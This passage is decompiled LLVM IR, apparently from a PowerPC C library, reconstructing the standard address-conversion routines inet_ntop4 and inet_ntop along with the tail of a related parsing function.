dec_label_pc_1001d9dc.thread:                     ; preds = %dec_label_pc_1001d9b8, %dec_label_pc_1001d9c4.preheader
  %v0_1001d9d8.lcssa = phi i32 [ %v1_1001d9dc.pre, %dec_label_pc_1001d9c4.preheader ], [ %v1_1001d9cc.pre, %dec_label_pc_1001d9b8 ]
  store i32 %v0_1001d9d8.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1001d9e4

dec_label_pc_1001d9dc:                            ; preds = %dec_label_pc_1001d998
  br i1 %v4_1001d9dc, label %dec_label_pc_1001d9e4, label %dec_label_pc_1001da10

dec_label_pc_1001d9e4:                            ; preds = %dec_label_pc_1001d9dc.thread, %dec_label_pc_1001d9dc
  %v0_1001d9e4 = load i32, i32* @r22, align 4
  store i32 %v0_1001d9e4, i32* @r3, align 4
  store i32 %v2_1001d860, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001d9f4.1197 to i32), i32* @lr, align 4
  %v0_1001d9f0 = call i32 @memcpy()
  store i32 %v0_1001d9f0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da14

dec_label_pc_1001d9fc:                            ; preds = %dec_label_pc_1001d840
  %v0_1001d9fc = call i32 @__errno_location()
  store i32 %v0_1001d9fc, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001da08 = inttoptr i32 %v0_1001d9fc to i32*
  store i32 97, i32* %v2_1001da08, align 4
  %v0_1001da18.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da14

dec_label_pc_1001da10:                            ; preds = %dec_label_pc_1001d904, %dec_label_pc_1001d8f8, %dec_label_pc_1001d8bc, %dec_label_pc_1001d8e4, %dec_label_pc_1001d9a0, %dec_label_pc_1001d944, %dec_label_pc_1001d930, %dec_label_pc_1001d9dc, %dec_label_pc_1001d884, %dec_label_pc_1001d97c, %dec_label_pc_1001d938
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da14

dec_label_pc_1001da14:                            ; preds = %dec_label_pc_1001d9fc, %dec_label_pc_1001d9e4, %dec_label_pc_1001d84c, %dec_label_pc_1001da10
  %v0_1001da18 = phi i32 [ %v0_1001da18.pre, %dec_label_pc_1001d9fc ], [ 1, %dec_label_pc_1001d9e4 ], [ %v2_1001d854, %dec_label_pc_1001d84c ], [ 0, %dec_label_pc_1001da10 ]
  store i32 %v0_1001d824, i32* %r0.global-to-local, align 4
  store i32 %v0_1001da18, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001da18

; uselistorder directives
  uselistorder i32 %v0_1001da18, { 1, 0 }
  uselistorder i32 %v2_1001d9cc, { 1, 0 }
  uselistorder i32 %v2_1001d9c8, { 1, 0 }
  uselistorder i32 %v0_1001d9c4.pre, { 2, 0, 1, 3 }
  uselistorder i1 %v4_1001d9dc, { 1, 0 }
  uselistorder i32 %v0_1001d9dc.pre, { 1, 0 }
  uselistorder i32 %v0_1001d988, { 1, 0 }
  uselistorder i32 %v0_1001d9dc.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001d968, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1001d910, { 1, 0 }
  uselistorder i32 %v1_1001d8c0, { 1, 0 }
  uselistorder i32 %v0_1001d830, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 8, 6, 9, 10, 11, 7, 14, 5, 12, 2, 1, 13, 4, 3, 15, 16, 17, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268556652, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1001da14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001da10, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1001d9e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d9b8, { 1, 0 }
  uselistorder label %dec_label_pc_1001d998, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d974, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d89c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001d89c, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1001da84.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1001da30 = load i32, i32* @lr, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* @r4, align 4
  store i32 15, i32* @r5, align 4
  %v2_1001da54 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1001da54, i32* @r3, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1001da68.1200 to i32), i32* @lr, align 4
  %v0_1001da64 = call i32 @__GI_memset()
  store i32 %v0_1001da64, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1001db282 = load i32, i32* @r1, align 4
  store i32 %v0_1001db282, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001da84

dec_label_pc_1001da84:                            ; preds = %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge, %dec_label_pc_1001da84.lr.ph
  %v2_1001daa4 = phi i32 [ %v2_1001db28, %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge ], [ %v0_1001db282, %dec_label_pc_1001da84.lr.ph ]
  %v0_1001da94 = phi i32 [ %v0_1001db28, %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge ], [ %v0_1001db282, %dec_label_pc_1001da84.lr.ph ]
  %v0_1001da88 = phi i32 [ %v1_1001db28, %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge ], [ 0, %dec_label_pc_1001da84.lr.ph ]
  %v1_1001da90 = phi i32 [ %v1_1001da84.pre, %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge ], [ 0, %dec_label_pc_1001da84.lr.ph ]
  %v0_1001da84 = load i32, i32* %r31.global-to-local, align 4
  %v2_1001da84 = add i32 %v0_1001da84, %v1_1001da90
  %v3_1001da84 = inttoptr i32 %v2_1001da84 to i8*
  %v4_1001da84 = load i8, i8* %v3_1001da84, align 1
  %v5_1001da84 = zext i8 %v4_1001da84 to i32
  store i32 %v5_1001da84, i32* %r10.global-to-local, align 4
  store i32 %v0_1001da88, i32* %r8.global-to-local, align 4
  %v1_1001da8c = add i32 %v0_1001da88, 1
  store i32 %v1_1001da8c, i32* %r11.global-to-local, align 4
  store i32 %v2_1001da84, i32* %r3.global-to-local, align 4
  %v2_1001da94 = add i32 %v1_1001da8c, %v0_1001da94
  store i32 %v2_1001da94, i32* %r6.global-to-local, align 4
  %v1_1001da98 = load i32, i32* @r28, align 4
  %v2_1001da98 = udiv i32 %v5_1001da84, %v1_1001da98
  %v1_1001da9c = add nuw nsw i32 %v2_1001da98, 48
  %v1_1001daa0 = urem i32 %v1_1001da9c, 256
  store i32 %v1_1001daa0, i32* %r0.global-to-local, align 4
  %v1_1001daa4 = trunc i32 %v1_1001da9c to i8
  %v3_1001daa4 = add i32 %v2_1001daa4, 8
  %v4_1001daa4 = inttoptr i32 %v3_1001daa4 to i8*
  store i8 %v1_1001daa4, i8* %v4_1001daa4, align 1
  %v0_1001daa8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001daa8 = icmp eq i32 %v0_1001daa8, 48
  %v0_1001dab0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1001dab0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001dab0 = udiv i32 %v0_1001dab0, %v1_1001dab0
  store i32 %v2_1001dab0, i32* %r9.global-to-local, align 4
  br i1 %v3_1001daa8, label %dec_label_pc_1001dab0, label %dec_label_pc_1001dadc

dec_label_pc_1001dab0:                            ; preds = %dec_label_pc_1001da84
  %v2_1001dab4 = udiv i32 %v2_1001dab0, %v1_1001dab0
  %tmp18 = mul i32 %v2_1001dab4, -10
  %v2_1001dabc = add i32 %v2_1001dab0, 48
  %v1_1001dac0 = add i32 %v2_1001dabc, %tmp18
  store i32 %v1_1001dac0, i32* %r9.global-to-local, align 4
  %v1_1001dac4 = urem i32 %v1_1001dac0, 256
  store i32 %v1_1001dac4, i32* %r0.global-to-local, align 4
  %v1_1001dac8 = trunc i32 %v1_1001dac0 to i8
  %v2_1001dac8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1001dac8 = add i32 %v2_1001dac8, 8
  %v4_1001dac8 = inttoptr i32 %v3_1001dac8 to i8*
  store i8 %v1_1001dac8, i8* %v4_1001dac8, align 1
  %v0_1001dacc = load i32, i32* %r0.global-to-local, align 4
  %v3_1001dacc = icmp eq i32 %v0_1001dacc, 48
  br i1 %v3_1001dacc, label %dec_label_pc_1001daf8, label %dec_label_pc_1001dad4

dec_label_pc_1001dad4:                            ; preds = %dec_label_pc_1001dab0
  %v0_1001dad4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001dad4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001daf8

dec_label_pc_1001dadc:                            ; preds = %dec_label_pc_1001da84
  %v0_1001dae0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001dae0 = add i32 %v0_1001dae0, 1
  store i32 %v1_1001dae0, i32* %r8.global-to-local, align 4
  %v2_1001dae4 = udiv i32 %v2_1001dab0, %v1_1001dab0
  %v1_1001dae8 = mul i32 %v2_1001dae4, 10
  store i32 %v1_1001dae8, i32* %r0.global-to-local, align 4
  %v2_1001daec = sub i32 %v2_1001dab0, %v1_1001dae8
  %v1_1001daf0 = add i32 %v2_1001daec, 48
  store i32 %v1_1001daf0, i32* %r9.global-to-local, align 4
  %v1_1001daf4 = trunc i32 %v1_1001daf0 to i8
  %v2_1001daf4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1001daf4 = add i32 %v2_1001daf4, 8
  %v4_1001daf4 = inttoptr i32 %v3_1001daf4 to i8*
  store i8 %v1_1001daf4, i8* %v4_1001daf4, align 1
  br label %dec_label_pc_1001daf8

dec_label_pc_1001daf8:                            ; preds = %dec_label_pc_1001dab0, %dec_label_pc_1001dad4, %dec_label_pc_1001dadc
  %v0_1001daf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001daf8 = inttoptr i32 %v0_1001daf8 to i8*
  %v2_1001daf8 = load i8, i8* %v1_1001daf8, align 1
  %v3_1001daf8 = zext i8 %v2_1001daf8 to i32
  %v0_1001dafc = load i32, i32* %r8.global-to-local, align 4
  %v1_1001dafc = add i32 %v0_1001dafc, 1
  %v0_1001db00 = load i32, i32* @r1, align 4
  %v2_1001db00 = add i32 %v0_1001db00, %v0_1001dafc
  store i32 %v2_1001db00, i32* %r10.global-to-local, align 4
  %v2_1001db04 = add i32 %v1_1001dafc, %v0_1001db00
  store i32 %v2_1001db04, i32* @r8, align 4
  %v0_1001db08 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001db08 = add i32 %v0_1001db08, 1
  store i32 %v1_1001db08, i32* %r4.global-to-local, align 4
  %v1_1001db0c = add i32 %v0_1001dafc, 2
  store i32 %v1_1001db0c, i32* %r11.global-to-local, align 4
  %v1_1001db10 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001db10 = udiv i32 %v3_1001daf8, %v1_1001db10
  %v1_1001db14 = mul nuw nsw i32 %v2_1001db10, 10
  store i32 %v1_1001db14, i32* %r0.global-to-local, align 4
  %v2_1001db18 = sub nsw i32 %v3_1001daf8, %v1_1001db14
  %v1_1001db1c = add nsw i32 %v2_1001db18, 48
  store i32 %v1_1001db1c, i32* %r9.global-to-local, align 4
  %v1_1001db20 = trunc i32 %v1_1001db1c to i8
  %v3_1001db20 = add i32 %v2_1001db00, 8
  %v4_1001db20 = inttoptr i32 %v3_1001db20 to i8*
  store i8 %v1_1001db20, i8* %v4_1001db20, align 1
  %v0_1001db24 = load i32, i32* %r12.global-to-local, align 4
  %v1_1001db24 = trunc i32 %v0_1001db24 to i8
  %v2_1001db24 = load i32, i32* @r8, align 4
  %v3_1001db24 = add i32 %v2_1001db24, 8
  %v4_1001db24 = inttoptr i32 %v3_1001db24 to i8*
  store i8 %v1_1001db24, i8* %v4_1001db24, align 1
  %v0_1001db28 = load i32, i32* @r1, align 4
  %v1_1001db28 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001db28 = add i32 %v1_1001db28, %v0_1001db28
  store i32 %v2_1001db28, i32* %r7.global-to-local, align 4
  %v0_1001db2c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001db2c = add i32 %v0_1001db2c, -1
  store i32 %v1_1001db2c, i32* %ctr.global-to-local, align 4
  %v2_1001db2c = icmp eq i32 %v1_1001db2c, 0
  br i1 %v2_1001db2c, label %dec_label_pc_1001db30, label %dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge

dec_label_pc_1001daf8.dec_label_pc_1001da84_crit_edge: ; preds = %dec_label_pc_1001daf8
  %v1_1001da84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001da84

dec_label_pc_1001db30:                            ; preds = %dec_label_pc_1001daf8
  %v2_1001db30 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1001db30, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001db38 = add i32 %v1_1001db28, %v2_1001db30
  store i32 %v2_1001db38, i32* %r9.global-to-local, align 4
  store i32 %v2_1001db30, i32* @r3, align 4
  %v3_1001db40 = add i32 %v2_1001db38, -1
  %v4_1001db40 = inttoptr i32 %v3_1001db40 to i8*
  store i8 0, i8* %v4_1001db40, align 1
  %v0_1001db44 = call i32 @__GI_strlen()
  store i32 %v0_1001db44, i32* %r3.global-to-local, align 4
  %v1_1001db48 = load i32, i32* @r30, align 4
  %v3_1001db48 = icmp ugt i32 %v0_1001db44, %v1_1001db48
  br i1 %v3_1001db48, label %dec_label_pc_1001db50, label %dec_label_pc_1001db64

dec_label_pc_1001db50:                            ; preds = %dec_label_pc_1001db30
  %v0_1001db50 = call i32 @__errno_location()
  store i32 %v0_1001db50, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001db5c = inttoptr i32 %v0_1001db50 to i32*
  store i32 28, i32* %v2_1001db5c, align 4
  %v0_1001db78.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001db74

dec_label_pc_1001db64:                            ; preds = %dec_label_pc_1001db30
  %v0_1001db64 = load i32, i32* @r29, align 4
  store i32 %v0_1001db64, i32* %r3.global-to-local, align 4
  store i32 %v2_1001db30, i32* %r4.global-to-local, align 4
  %v2_1001db6c = bitcast i16* %stack_var_-56 to i8*
  %v3_1001db6c = call i32 @strcpy(i32 %v0_1001db64, i8* %v2_1001db6c)
  store i32 %v3_1001db6c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001db6c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001db74

dec_label_pc_1001db74:                            ; preds = %dec_label_pc_1001db50, %dec_label_pc_1001db64
  %v0_1001db78 = phi i32 [ %v0_1001db78.pre, %dec_label_pc_1001db50 ], [ %v3_1001db6c, %dec_label_pc_1001db64 ]
  store i32 %v0_1001da30, i32* %r0.global-to-local, align 4
  store i32 %v0_1001db78, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001db78

; uselistorder directives
  uselistorder i32 %v0_1001db78, { 1, 0 }
  uselistorder i32 %v2_1001db30, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001db2c, { 1, 0 }
  uselistorder i32 %v2_1001db28, { 1, 0 }
  uselistorder i32 %v0_1001dafc, { 1, 0, 2 }
  uselistorder i32 %v3_1001daf8, { 1, 0 }
  uselistorder i32 %v1_1001dac0, { 1, 0, 2 }
  uselistorder i32 %v2_1001dab0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1001da9c, { 1, 0 }
  uselistorder i32 %v0_1001da88, { 1, 0 }
  uselistorder i32 %v0_1001db282, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001db74, { 1, 0 }
  uselistorder label %dec_label_pc_1001daf8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1001db94 = icmp slt i32 %arg1, 2
  %v3_1001db94 = icmp eq i32 %arg1, 2
  store i1 %v1_1001db94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001db94, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1001db94, label %dec_label_pc_1001dbbc, label %dec_label_pc_1001dbb0

dec_label_pc_1001dbb0:                            ; preds = %entry
  %v1_1001dbb0 = icmp slt i32 %arg1, 10
  %v3_1001dbb0 = icmp eq i32 %arg1, 10
  store i1 %v1_1001dbb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dbb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dbb0, label %dec_label_pc_1001dbf4.lr.ph, label %dec_label_pc_1001de08

dec_label_pc_1001dbbc:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001dbcc.1202 to i32), i32* @lr, align 4
  %v3_1001dbc8 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1001de00

dec_label_pc_1001dbf4.lr.ph:                      ; preds = %dec_label_pc_1001dbb0
  %v2_1001dbd0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1001dbd0, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_1001dbd0, i32* @r3, align 4
  store i32 32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001dbe4.1203 to i32), i32* @lr, align 4
  %v0_1001dbe0 = call i32 @__GI_memset()
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001dc1415 = load i32, i32* @r27, align 4
  store i32 %v0_1001dc1415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001dbf4

dec_label_pc_1001dbf4:                            ; preds = %dec_label_pc_1001dbf4.lr.ph, %dec_label_pc_1001dbf4
  %v1_1001dc08 = phi i32 [ 0, %dec_label_pc_1001dbf4.lr.ph ], [ %v1_1001dc18, %dec_label_pc_1001dbf4 ]
  %v0_1001dbf4 = phi i32 [ %v0_1001dc1415, %dec_label_pc_1001dbf4.lr.ph ], [ %v0_1001dc14, %dec_label_pc_1001dbf4 ]
  %v0_1001dbfc = phi i32 [ %v0_1001dc1415, %dec_label_pc_1001dbf4.lr.ph ], [ %v2_1001dc14, %dec_label_pc_1001dbf4 ]
  %v1_1001dbf4 = phi i32 [ 0, %dec_label_pc_1001dbf4.lr.ph ], [ %v0_1001dc0c, %dec_label_pc_1001dbf4 ]
  %v2_1001dbf4 = add i32 %v0_1001dbf4, %v1_1001dbf4
  %v3_1001dbf4 = inttoptr i32 %v2_1001dbf4 to i8*
  %v4_1001dbf4 = load i8, i8* %v3_1001dbf4, align 1
  %v5_1001dbf4 = zext i8 %v4_1001dbf4 to i32
  %v1_1001dbf8 = add i32 %v1_1001dbf4, 2
  store i32 %v1_1001dbf8, i32* %r11.global-to-local, align 4
  %v1_1001dbfc = add i32 %v0_1001dbfc, 1
  %v2_1001dbfc = inttoptr i32 %v1_1001dbfc to i8*
  %v3_1001dbfc = load i8, i8* %v2_1001dbfc, align 1
  %v4_1001dbfc = zext i8 %v3_1001dbfc to i32
  %v1_1001dc00 = mul nuw nsw i32 %v5_1001dbf4, 256
  %v2_1001dc04 = or i32 %v4_1001dbfc, %v1_1001dc00
  %v2_1001dc08 = load i32, i32* %r29.global-to-local, align 4
  %v3_1001dc08 = add i32 %v2_1001dc08, %v1_1001dc08
  %v4_1001dc08 = inttoptr i32 %v3_1001dc08 to i32*
  store i32 %v2_1001dc04, i32* %v4_1001dc08, align 4
  %v0_1001dc0c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001dc0c = udiv i32 %v0_1001dc0c, 2
  %v0_1001dc14 = load i32, i32* @r27, align 4
  %v2_1001dc14 = add i32 %v0_1001dc14, %v0_1001dc0c
  store i32 %v2_1001dc14, i32* %r9.global-to-local, align 4
  %v1_1001dc18 = mul i32 %v1_1001dc0c, 4
  %v0_1001dc1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001dc1c = add i32 %v0_1001dc1c, -1
  store i32 %v1_1001dc1c, i32* %ctr.global-to-local, align 4
  %v2_1001dc1c = icmp eq i32 %v1_1001dc1c, 0
  br i1 %v2_1001dc1c, label %dec_label_pc_1001dc3c.lr.ph, label %dec_label_pc_1001dbf4

dec_label_pc_1001dc3c.lr.ph:                      ; preds = %dec_label_pc_1001dbf4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001dc3c

dec_label_pc_1001dc3c:                            ; preds = %dec_label_pc_1001dc3c.lr.ph, %dec_label_pc_1001dc88
  %v0_1001dc8c = phi i32 [ 8, %dec_label_pc_1001dc3c.lr.ph ], [ %v1_1001dc8c, %dec_label_pc_1001dc88 ]
  %v0_1001dc7c = phi i32 [ -1, %dec_label_pc_1001dc3c.lr.ph ], [ %v0_1001dc7c42, %dec_label_pc_1001dc88 ]
  %v0_1001dc6c = phi i32 [ -1, %dec_label_pc_1001dc3c.lr.ph ], [ %v0_1001dc6c39, %dec_label_pc_1001dc88 ]
  %v0_1001dc40 = phi i32 [ -1, %dec_label_pc_1001dc3c.lr.ph ], [ %v0_1001dc4035, %dec_label_pc_1001dc88 ]
  %v0_1001dc88 = phi i32 [ 0, %dec_label_pc_1001dc3c.lr.ph ], [ %v1_1001dc88, %dec_label_pc_1001dc88 ]
  %v1_1001dc3c = mul i32 %v0_1001dc88, 4
  %v3_1001dc40 = icmp eq i32 %v0_1001dc40, -1
  %v2_1001dc44 = add i32 %v1_1001dc3c, %v2_1001dbd0
  %v3_1001dc44 = inttoptr i32 %v2_1001dc44 to i32*
  %v4_1001dc44 = load i32, i32* %v3_1001dc44, align 4
  %v3_1001dc48 = icmp eq i32 %v4_1001dc44, 0
  br i1 %v3_1001dc48, label %dec_label_pc_1001dc50, label %dec_label_pc_1001dc68

dec_label_pc_1001dc50:                            ; preds = %dec_label_pc_1001dc3c
  br i1 %v3_1001dc40, label %dec_label_pc_1001dc54, label %dec_label_pc_1001dc60

dec_label_pc_1001dc54:                            ; preds = %dec_label_pc_1001dc50
  store i32 %v0_1001dc88, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1001dc88

dec_label_pc_1001dc60:                            ; preds = %dec_label_pc_1001dc50
  %v0_1001dc60 = load i32, i32* @r31, align 4
  %v1_1001dc60 = add i32 %v0_1001dc60, 1
  store i32 %v1_1001dc60, i32* @r31, align 4
  br label %dec_label_pc_1001dc88

dec_label_pc_1001dc68:                            ; preds = %dec_label_pc_1001dc3c
  br i1 %v3_1001dc40, label %dec_label_pc_1001dc88, label %dec_label_pc_1001dc6c

dec_label_pc_1001dc6c:                            ; preds = %dec_label_pc_1001dc68
  %v3_1001dc6c = icmp eq i32 %v0_1001dc6c, -1
  %v0_1001dc80.pre = load i32, i32* @r31, align 4
  %v1_1001dc74 = load i32, i32* @r30, align 4
  %v3_1001dc74 = icmp sgt i32 %v0_1001dc80.pre, %v1_1001dc74
  %or.cond = or i1 %v3_1001dc6c, %v3_1001dc74
  br i1 %or.cond, label %dec_label_pc_1001dc7c, label %dec_label_pc_1001dc84

dec_label_pc_1001dc7c:                            ; preds = %dec_label_pc_1001dc6c
  store i32 %v0_1001dc7c, i32* @r28, align 4
  store i32 %v0_1001dc80.pre, i32* @r30, align 4
  br label %dec_label_pc_1001dc84

dec_label_pc_1001dc84:                            ; preds = %dec_label_pc_1001dc6c, %dec_label_pc_1001dc7c
  %v0_1001dc6c40 = phi i32 [ %v0_1001dc7c, %dec_label_pc_1001dc7c ], [ %v0_1001dc6c, %dec_label_pc_1001dc6c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001dc88

dec_label_pc_1001dc88:                            ; preds = %dec_label_pc_1001dc68, %dec_label_pc_1001dc60, %dec_label_pc_1001dc54, %dec_label_pc_1001dc84
  %v0_1001dc7c42 = phi i32 [ %v0_1001dc7c, %dec_label_pc_1001dc68 ], [ %v0_1001dc7c, %dec_label_pc_1001dc60 ], [ %v0_1001dc88, %dec_label_pc_1001dc54 ], [ -1, %dec_label_pc_1001dc84 ]
  %v0_1001dc4035 = phi i32 [ -1, %dec_label_pc_1001dc68 ], [ %v0_1001dc40, %dec_label_pc_1001dc60 ], [ %v0_1001dc88, %dec_label_pc_1001dc54 ], [ -1, %dec_label_pc_1001dc84 ]
  %v0_1001dc6c39 = phi i32 [ %v0_1001dc6c, %dec_label_pc_1001dc68 ], [ %v0_1001dc6c, %dec_label_pc_1001dc60 ], [ %v0_1001dc6c, %dec_label_pc_1001dc54 ], [ %v0_1001dc6c40, %dec_label_pc_1001dc84 ]
  %v1_1001dc88 = add nuw nsw i32 %v0_1001dc88, 1
  store i32 %v1_1001dc88, i32* %r11.global-to-local, align 4
  %v1_1001dc8c = add nsw i32 %v0_1001dc8c, -1
  store i32 %v1_1001dc8c, i32* %ctr.global-to-local, align 4
  %v2_1001dc8c = icmp eq i32 %v1_1001dc8c, 0
  br i1 %v2_1001dc8c, label %dec_label_pc_1001dc90, label %dec_label_pc_1001dc3c

dec_label_pc_1001dc90:                            ; preds = %dec_label_pc_1001dc88
  %v3_1001dc90 = icmp eq i32 %v0_1001dc7c42, -1
  %v1_1001dcb0 = icmp slt i32 %v0_1001dc6c39, -1
  %v3_1001dcb0 = icmp eq i32 %v0_1001dc6c39, -1
  store i1 %v1_1001dcb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dc90, label %dec_label_pc_1001dcb0, label %dec_label_pc_1001dc98

dec_label_pc_1001dc98:                            ; preds = %dec_label_pc_1001dc90
  %v0_1001dca8.pre = load i32, i32* @r31, align 4
  br i1 %v3_1001dcb0, label %dec_label_pc_1001dca8, label %dec_label_pc_1001dca0

dec_label_pc_1001dca0:                            ; preds = %dec_label_pc_1001dc98
  %v1_1001dca0 = load i32, i32* @r30, align 4
  %v2_1001dca0 = icmp slt i32 %v0_1001dca8.pre, %v1_1001dca0
  %v3_1001dca0 = icmp sgt i32 %v0_1001dca8.pre, %v1_1001dca0
  %v4_1001dca0 = icmp eq i32 %v0_1001dca8.pre, %v1_1001dca0
  store i1 %v2_1001dca0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dca0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dca0, label %dec_label_pc_1001dca8, label %dec_label_pc_1001dcb0.thread

dec_label_pc_1001dca8:                            ; preds = %dec_label_pc_1001dc98, %dec_label_pc_1001dca0
